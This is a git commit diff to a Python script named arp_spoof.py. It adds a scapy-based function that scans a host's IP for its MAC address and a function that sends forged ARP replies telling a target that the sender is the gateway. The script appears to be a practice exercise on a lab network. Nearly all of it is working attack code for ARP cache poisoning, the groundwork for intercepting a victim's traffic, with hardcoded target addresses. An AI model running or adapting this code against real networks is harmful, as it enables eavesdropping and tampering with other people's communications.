e3780e2f505c11d3b0d14c9874f99071cdfac8da
kali <hackenstance@proton.me>
2026-04-01 07:08:38 -0500

    Extract MAC Address of target from IP

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,14 +1,24 @@
 #/usr/bin/env python
-from scapy.layers.l2 import ARP
+from scapy.layers.l2 import ARP, Ether
 import scapy.all as scapy
 
-# Send packet to Client (target) IP, telling it I have the Router (gateway) MAC Address.
-# Create an ARP Response, with fields:
-# op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
-# psrc=[SOURCE_IP], tells TARGET the SOURCE is the ROUTER.
-packet = ARP(op=2, pdst="192.168.63.174", hwdst="00-50-56-e8-00-20", psrc="192.168.63.2" )
-# # Show tells us the MAC Address results
-# print(packet.show())
-# # Summarize the MAC Address results
-# print(packet.summary())
-scapy.send(packet)
+
+def scan(ip):
+    arp_request = ARP(pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    broadcast_arp_request = broadcast / arp_request
+    answered_list, unanswered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)
+    clients_list = []
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients_list.append(client_dict)
+    print(clients_list)
+
+def spoof(target_ip,spoof_ip):
+    # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
+    # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
+    # psrc=[SOURCE_IP](GATEWAY_IP)
+    packet = ARP(op=2, pdst=target_ip, hwdst="00-50-56-e8-00-20", psrc=spoof_ip)
+    scapy.send(packet)
+
+scan("192.168.63.174")
